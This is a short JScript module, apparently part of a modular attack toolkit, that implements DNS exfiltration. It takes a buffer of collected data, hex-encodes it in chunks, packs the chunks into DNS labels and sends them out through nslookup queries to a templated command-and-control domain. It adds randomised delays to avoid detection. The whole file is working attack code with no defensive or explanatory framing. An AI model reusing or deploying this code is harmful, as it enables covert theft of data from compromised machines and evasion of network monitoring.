// chunk: exfil/dns_exfil
// depends: core/emit_buffer, core/run_cmd
// provides: exfil_dns
// format: jscript

function _hex(s) {
    var r = "";
    for (var i = 0; i < s.length; i++) {
        var h = s.charCodeAt(i).toString(16);
        if (h.length < 2) h = "0" + h;
        r += h;
    }
    return r;
}

function exfil_dns() {
    var domain = "{{C2_DOMAIN}}";
    var chunkSize = 30;
    var data = _buf;
    var seq = 0;
    for (var i = 0; i < data.length; i += chunkSize) {
        var piece = data.substring(i, Math.min(i + chunkSize, data.length));
        var encoded = _hex(piece);
        var labels = [];
        for (var j = 0; j < encoded.length; j += 60) {
            labels.push(encoded.substring(j, Math.min(j + 60, encoded.length)));
        }
        var query = seq + "." + labels.join(".") + "." + domain;
        _run("nslookup " + query + " 2>NUL");
        seq++;
        WScript.Sleep(100 + Math.floor(Math.random() * 400));
    }
}
